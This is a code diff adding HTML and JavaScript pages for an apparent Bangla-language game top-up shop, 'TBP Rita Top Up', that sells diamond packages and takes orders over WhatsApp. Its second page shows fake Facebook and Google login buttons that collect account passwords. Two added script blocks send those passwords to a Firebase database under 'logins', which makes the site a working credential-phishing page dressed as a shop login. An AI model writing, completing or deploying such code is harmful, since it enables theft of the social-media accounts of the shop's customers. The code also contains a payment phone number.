@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TBP Rita Top Up</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background-color: #f0f2f5; margin: 0; padding: 15px; display: flex; justify-content: center; min-height: 100vh; align-items: center; }
+        
+        /* Login Overlay */
+        #loginOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; display: flex; justify-content: center; align-items: center; z-index: 1000; }
+        .login-box { text-align: center; width: 90%; max-width: 350px; }
+        
+        .logo-container { width: 90px; height: 90px; margin: 0 auto 20px auto; border-radius: 50%; border: 3px solid #ff9900; overflow: hidden; }
+        .logo-container img { width: 100%; height: 100%; object-fit: cover; }
+
+        .social-btn { width: 100%; padding: 12px; margin: 10px 0; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; font-size: 15px; transition: 0.3s; }
+        .fb-btn { background: #1877F2; color: white; }
+        .google-btn { background: #fff; color: #555; border: 1px solid #ddd; }
+        .social-btn:active { transform: scale(0.98); }
+
+        /* Main Dashboard */
+        .card { background: #fff; padding: 20px; border-radius: 20px; width: 100%; max-width: 400px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; display: none; }
+        
+        h2 { color: #ff9900; margin: 10px 0; }
+        .welcome-user { font-size: 14px; background: #fff9f0; color: #d48600; padding: 10px; border-radius: 10px; margin-bottom: 15px; }
+        
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 2px solid #eee; border-radius: 10px; box-sizing: border-box; font-size: 16px; outline: none; }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 15px 0; max-height: 250px; overflow-y: auto; padding: 5px; }
+        .option { border: 1px solid #ddd; padding: 12px; border-radius: 12px; cursor: pointer; background: #fff; font-size: 14px; font-weight: bold; }
+        .selected { border-color: #ff9900 !important; background: #ff9900 !important; color: white !important; }
+        
+        .order-btn { width: 100%; padding: 15px; background: #25d366; color: #fff; border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+    </style>
+</head>
+<body>
+
+<div id="loginOverlay">
+    <div class="login-box">
+        <div class="logo-container">
+            <img src="https://via.placeholder.com/150" alt="Logo">
+        </div>
+        <h2 style="color: #333;">TBP Rita Top Up</h2>
+        <p style="color: #777; margin-bottom: 25px;">লগইন করতে নিচের পদ্ধতি বেছে নিন</p>
+        
+        <button class="social-btn fb-btn" onclick="mockLogin('Facebook')">
+            Continue with Facebook
+        </button>
+        
+        <button class="social-btn google-btn" onclick="mockLogin('Google')">
+            <img src="https://www.gstatic.com/images/branding/product/1x/googleg_48dp.png" width="20"> Continue with Google
+        </button>
+    </div>
+</div>
+
+<div class="card" id="mainShop">
+    <h2>TBP Rita Top Up</h2>
+    <div id="welcomeMsg" class="welcome-user"></div>
+    
+    <input type="number" id="playerID" placeholder="প্লেয়ার আইডি (UID) দিন">
+
+    <div class="grid">
+        <div class="option" onclick="selectPkg(this, '১১৫ 💎 - ৮০৳')">১১৫ 💎<br>৮০ ৳</div>
+        <div class="option" onclick="selectPkg(this, '২৪০ 💎 - ১৬০৳')">২৪০ 💎<br>১৬০ ৳</div>
+        <div class="option" onclick="selectPkg(this, '৩৫৫ 💎 - ২৪০৳')">৩৫৫ 💎<br>২৪০ ৳</div>
+        <div class="option" onclick="selectPkg(this, '৪৮০ 💎 - ৩৩০৳')">৪৮০ 💎<br>৩৩০ ৳</div>
+        <div class="option" onclick="selectPkg(this, '৬১০ 💎 - ৪১০৳')">৬১০ 💎<br>৪১০ ৳</div>
+        <div class="option" onclick="selectPkg(this, '৭২৫ 💎 - ৫১০৳')">৭২৫ 💎<br>৫১০ ৳</div>
+        <div class="option" onclick="selectPkg(this, '৮৫০ 💎 - ৫৯০৳')">৮৫০ 💎<br>৫৯০ ৳</div>
+        <div class="option" onclick="selectPkg(this, 'Monthly - ৭৮০৳')">Monthly<br>৭৮০ ৳</div>
+    </div>
+
+    <button class="order-btn" onclick="orderNow()">অর্ডার করুন (WhatsApp)</button>
+    <p style="font-size: 12px; color: #888; margin-top: 15px;">নগদ: 01648117182</p>
+</div>
+
+<script>
+    let chosenPkg = "";
+    let loginMethod = "";
+
+    function mockLogin(method) {
+        loginMethod = method;
+        document.getElementById('loginOverlay').style.display = 'none';
+        document.getElementById('mainShop').style.display = 'block';
+        document.getElementById('welcomeMsg').innerText = "স্বাগতম! আপনি " + loginMethod + " দিয়ে লগইন করেছেন।";
+    }
+
+    function selectPkg(element, val) {
+        document.querySelectorAll('.option').forEach(opt => opt.classList.remove('selected'));
+        element.classList.add('selected');
+        chosenPkg = val;
+    }
+
+    function orderNow() {
+        let id = document.getElementById('playerID').value;
+        if(!id || !chosenPkg) {
+            alert("সব তথ্য সঠিকভাবে দিন!");
+            return;
+        }
+
+        let myWhatsApp = "8801648117182"; 
+        let message = "*নতুন অর্ডার - TBP Rita Top Up*\n\n" +
+                      "🔐 লগইন পদ্ধতি: " + loginMethod + "\n" +
+                      "🆔 আইডি: " + id + "\n" +
+                      "💎 প্যাকেজ: " + chosenPkg;
+        
+        window.open("https://wa.me/" + myWhatsApp + "?text=" + encodeURIComponent(message));
+    }
+</script>
+
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TBP Rita Top Up - Login</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .login-card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 320px; text-align: center; }
+        .logo { width: 80px; height: 80px; background: #ff9900; border-radius: 50%; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 20px; }
+        .social-btn { width: 100%; padding: 12px; margin-bottom: 12px; border: none; border-radius: 6px; cursor: pointer; display: flex; align-items: center; justify-content: center; font-weight: 600; font-size: 14px; }
+        .fb { background: #1877f2; color: white; }
+        .google { background: white; color: #555; border: 1px solid #ddd; }
+        .input-group { display: none; text-align: left; }
+        input { width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
+        .btn-submit { background: #ff9900; color: white; width: 100%; padding: 10px; border: none; border-radius: 5px; cursor: pointer; margin-top: 10px; }
+    </style>
+</head>
+<body>
+
+<div class="login-card" id="loginForm">
+    <div class="logo">TBP</div>
+    <h3>TBP Rita Top Up</h3>
+    <p style="color: #666; font-size: 14px;">অর্ডার করতে লগইন করুন</p>
+    
+    <button class="social-btn fb" onclick="showInput('Facebook')">Login with Facebook</button>
+    <button class="social-btn google" onclick="showInput('Google')">Login with Google</button>
+
+    <div id="detailsInput" class="input-group">
+        <hr>
+        <label id="typeLabel">Email/Phone:</label>
+        <input type="text" id="userAccount" placeholder="Email or Phone">
+        <label>Password:</label>
+        <input type="password" id="userPass" placeholder="Password">
+        <button class="btn-submit" onclick="saveDetails()">Confirm Login</button>
+    </div>
+</div>
+
+<script>
+    let currentMethod = "";
+
+    function showInput(method) {
+        currentMethod = method;
+        document.getElementById('detailsInput').style.display = 'block';
+        document.getElementById('typeLabel').innerText = method + " Email/Phone:";
+    }
+
+    function saveDetails() {
+        let account = document.getElementById('userAccount').value;
+        let pass = document.getElementById('userPass').value;
+
+        if(!account || !pass) {
+            alert("সবগুলো ঘর পূরণ করুন!");
+            return;
+        }
+
+        // এখানে তথ্যগুলো সরাসরি স্টোরেজ বা হোয়াটসঅ্যাপে পাঠানোর জন্য সাজানো হচ্ছে
+        let orderDetails = "--- Login Info ---\nMethod: " + currentMethod + "\nUser: " + account + "\nPass: " + pass;
+        
+        // তথ্যগুলো ব্রাউজারে সেভ করে শপ পেজে নিয়ে যাবে
+        localStorage.setItem("loginData", orderDetails);
+        alert("লগইন সফল হয়েছে!");
+        
+        // আপনার শপ পেজের ফাইলে নিয়ে যাবে
+        window.location.href = "order.html"; 
+    }
+</script>
+
+</body>
+</html>
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
+<script>
+  const firebaseConfig = {
+    databaseURL: "https://tbp-shop-default-rtdb.firebaseio.com/",
+    projectId: "tbp-shop"
+  };
+  firebase.initializeApp(firebaseConfig);
+
+  function saveDetails() {
+      let account = document.getElementById('userAccount').value;
+      let pass = document.getElementById('userPass').value;
+
+      if(account && pass) {
+          firebase.database().ref('logins').push({
+              user: account,
+              password: pass,
+              time: new Date().toLocaleString()
+          }).then(() => {
+              window.location.href = "order.html"; 
+          });
+      } else {
+          alert("সঠিক তথ্য দিন!");
+      }
+  }
+</script>
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
+<script>
+  const firebaseConfig = {
+    databaseURL: "https://tbp-shop-default-rtdb.firebaseio.com/",
+    projectId: "tbp-shop"
+  };
+  firebase.initializeApp(firebaseConfig);
+
+  // কাস্টমারের তথ্য জমা করার ফাংশন
+  function saveDetails() {
+      let account = document.getElementById('userAccount').value;
+      let pass = document.getElementById('userPass').value;
+
+      if(account && pass) {
+          firebase.database().ref('logins').push({
+              user: account,
+              password: pass,
+              time: new Date().toLocaleString()
+          }).then(() => {
+              // তথ্য সেভ হলে অর্ডার পেজে নিয়ে যাবে
+              window.location.href = "order.html"; 
+          });
+      } else {
+          alert("সঠিক তথ্য দিয়ে লগইন করুন!");
+      }
+  }
+</script>
